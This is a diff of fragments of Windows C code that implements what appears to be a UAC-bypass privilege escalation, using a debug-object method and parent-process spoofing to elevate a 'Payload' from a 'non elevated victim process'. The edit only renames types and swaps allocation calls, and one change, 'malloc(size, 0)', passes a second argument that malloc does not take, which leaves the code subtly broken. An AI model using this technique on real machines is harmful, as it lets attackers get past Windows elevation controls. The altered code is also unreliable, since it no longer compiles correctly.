@@ -5,7 +5,7 @@ NTSTATUS ucmxCreateProcessFromParent(
 	_In_ LPWSTR Payload)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
-	SIZE_T size = 0x30;
+	size_t size = 0x30;
 
 	STARTUPINFOEX si;
 	PROCESS_INFORMATION pi;
@@ -18,7 +18,7 @@ NTSTATUS ucmxCreateProcessFromParent(
 		if (size > 1024)
 			break;
 
-		si.lpAttributeList = AllocMemory(size, 0);
+		si.lpAttributeList = malloc(size, 0);
 		if (si.lpAttributeList) {
 			if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
 				if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
@@ -48,7 +48,7 @@ NTSTATUS ucmxCreateProcessFromParent(
 			if (si.lpAttributeList)
 				DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
 
-			FreeMemory(si.lpAttributeList);
+			free(si.lpAttributeList);
 		}
 	} while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);
 
@@ -58,7 +58,7 @@ NTSTATUS ucmxCreateProcessFromParent(
 NTSTATUS ucmDebugObjectMethod(
 	_In_ LPWSTR lpszPayload
 ) {
-	//UINT retryCount = 0;
+	//uint retryCount = 0;
 	NTSTATUS status = STATUS_ACCESS_DENIED;
 
 	// Spawn initial non elevated victim process under debug.
@@ -70,7 +70,7 @@ NTSTATUS ucmDebugObjectMethod(
 	CopyMemory(szSysRoot, szSysDir, 3 * sizeof(WCHAR));
 	szSysRoot[3] = L'\0';
 
-	SIZE_T nResult;
+	size_t nResult;
 	StringCchLengthW(szSysDir, MAX_PATH, &nResult);
 	WCHAR szProcess[MAX_PATH];
 	CopyMemory(szProcess, szSysDir, (nResult + 1) * sizeof(WCHAR));
@@ -89,7 +89,7 @@ NTSTATUS ucmDebugObjectMethod(
 	typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
 		_In_  HANDLE ProcessHandle,
 		_In_  ULONG  ProcessInformationClass,
-		_Out_ PVOID  ProcessInformation,
+		_Out_ void*  ProcessInformation,
 		_In_  ULONG  ProcessInformationLength,
 		_Out_ PULONG ReturnLength
 		);
